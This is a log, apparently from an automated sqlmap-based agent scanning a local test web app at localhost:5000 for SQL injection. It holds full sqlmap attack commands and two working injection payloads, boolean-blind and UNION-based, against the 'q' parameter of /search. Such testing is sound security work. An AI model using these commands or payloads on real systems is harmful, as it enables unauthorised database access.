WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Search_Users_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/search --output-dir 'attack-logs-dynamic\Search_Users_sqlmap' --batch --level=5 --risk=3 --threads 5 --data q=test --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:24 /2025-09-26/
INFO - [20:16:26] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap' as the output directory
INFO - [20:16:27] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:16:27] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: q (POST)
INFO -     Type: boolean-based blind
INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
INFO -     Payload: q=test' OR NOT 4394=4394-- Trsa
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (NULL) - 2 columns
INFO -     Payload: q=test' UNION ALL SELECT NULL,CHAR(113,118,107,122,113)||CHAR(121,66,73,80,87,73,114,109,87,69,110,105,119,70,79,80,112,88,66,100,74,88,76,100,122,85,105,118,105,79,76,77,79,79,115,110,86,102,71,89)||CHAR(113,113,118,98,113)-- Ufkr
INFO - ---
INFO - [20:16:27] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:16:27] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
INFO - [20:16:27] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_Users_sqlmap\localhost'
INFO - [*] ending @ 20:16:27 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Search_Users_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/api/users -H 'Content-Type: application/json' --data '{"email": "test"}'
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:30 /2025-09-26/
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:16:32] [INFO] flushing session file
INFO - [20:16:32] [INFO] testing connection to the target URL
INFO - [20:16:32] [CRITICAL] page not found (404)
INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
INFO - [20:16:32] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 1 times
INFO - [*] ending @ 20:16:32 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/api/users (log: attack-logs-dynamic\Get_User_by_Email__API__flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/api/users --output-dir 'attack-logs-dynamic\Get_User_by_Email__API__sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"email": "test"}' --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:36 /2025-09-26/
INFO - [20:16:38] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_Email__API__sqlmap' as the output directory
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:16:38] [INFO] testing connection to the target URL
INFO - [20:16:38] [CRITICAL] page not found (404)
INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
INFO - [20:16:38] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 1 times
INFO - [*] ending @ 20:16:38 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/api/users
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/tools/dns-lookup
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:42 /2025-09-26/
INFO - [20:16:44] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:16:44] [INFO] testing connection to the target URL
INFO - [20:16:44] [INFO] testing if the target URL content is stable
INFO - [20:16:44] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
INFO - [20:16:44] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:16:44] [WARNING] URI parameter '#1*' does not appear to be dynamic
INFO - [20:16:44] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:16:44] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:16:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:16:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:16:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:16:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:16:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:16:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:16:45] [INFO] testing 'Generic inline queries'
INFO - [20:16:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:16:45] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:16:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:16:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:16:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:16:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:16:45] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:16:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:16:45] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:16:45] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:16:45] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 73 times
INFO - [*] ending @ 20:16:45 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/tools/dns-lookup (log: attack-logs-dynamic\DNS_Lookup_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/tools/dns-lookup?host=test' --output-dir 'attack-logs-dynamic\DNS_Lookup_sqlmap' --batch --level=5 --risk=3 --threads 5 -p host --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:16:49 /2025-09-26/
INFO - [20:16:51] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\DNS_Lookup_sqlmap' as the output directory
INFO - [20:16:51] [INFO] testing connection to the target URL
INFO - [20:16:51] [INFO] testing if the target URL content is stable
INFO - [20:16:52] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
INFO - [20:16:52] [WARNING] heuristic (basic) test shows that GET parameter 'host' might not be injectable
INFO - [20:16:52] [INFO] testing for SQL injection on GET parameter 'host'
INFO - [20:16:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:16:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:16:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:16:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:16:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:16:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:16:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:16:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:16:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:16:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:16:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:16:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:16:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:16:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:16:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:16:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:16:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:16:58] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:16:59] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:16:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:17:00] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:17:00] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:17:01] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:17:01] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:17:02] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:17:02] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:17:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:17:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:17:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:17:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:17:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:17:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:17:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:17:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:17:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:17:03] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:17:03] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:17:03] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:17:03] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:17:03] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:17:03] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:17:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:17:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:17:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:17:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:17:03] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:03] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:03] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:03] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:03] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:17:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:17:03] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:03] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:03] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:03] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:04] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:04] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:04] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:04] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:17:04] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:04] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:17:04] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:17:04] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:17:04] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:17:05] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:17:05] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:17:05] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:17:05] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:17:06] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:17:06] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:17:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:17:07] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:17:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:17:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:17:09] [WARNING] GET parameter 'host' does not seem to be injectable
INFO - [20:17:09] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:17:09] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:17:09] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:17:09] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:17:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:17:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:17:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:17:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:17:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:17:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:17:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:17:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:17:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:17:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:17:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:17:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:17:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:17:13] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:17:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:17:14] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:17:14] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:17:15] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:17:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:17:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:17:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:17:17] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:17:18] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:17:18] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:17:19] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:17:19] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:17:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:17:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:17:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:17:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:17:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:17:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:17:20] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:17:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:17:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:17:20] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:17:20] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:17:20] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:17:20] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:17:20] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:17:20] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:17:20] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:17:20] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:17:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:17:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:17:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:17:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:17:20] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:17:20] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:17:20] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:17:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:17:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:17:21] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:17:21] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:17:21] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:17:21] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:17:22] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:17:22] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:17:22] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:17:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:17:23] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:17:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:17:24] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:17:25] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:17:25] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [*] ending @ 20:17:25 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/tools/dns-lookup
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/xxe --data test=1
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:17:28 /2025-09-26/
INFO - [20:17:31] [INFO] testing connection to the target URL
INFO - [20:17:31] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:17:31] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:17:31] [INFO] testing if the target URL content is stable
INFO - [20:17:31] [INFO] target URL content is stable
INFO - [20:17:31] [INFO] testing if POST parameter 'test' is dynamic
INFO - [20:17:31] [WARNING] POST parameter 'test' does not appear to be dynamic
INFO - [20:17:31] [WARNING] heuristic (basic) test shows that POST parameter 'test' might not be injectable
INFO - [20:17:31] [INFO] testing for SQL injection on POST parameter 'test'
INFO - [20:17:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:17:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:17:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:17:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:17:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:17:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:17:32] [INFO] testing 'Generic inline queries'
INFO - [20:17:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:17:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:17:32] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:17:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:17:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:17:32] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:17:32] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:17:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:17:32] [WARNING] POST parameter 'test' does not seem to be injectable
INFO - [20:17:32] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:17:32] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 75 times
INFO - [*] ending @ 20:17:32 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/xxe (log: attack-logs-dynamic\XXE_Injection_flush.log)
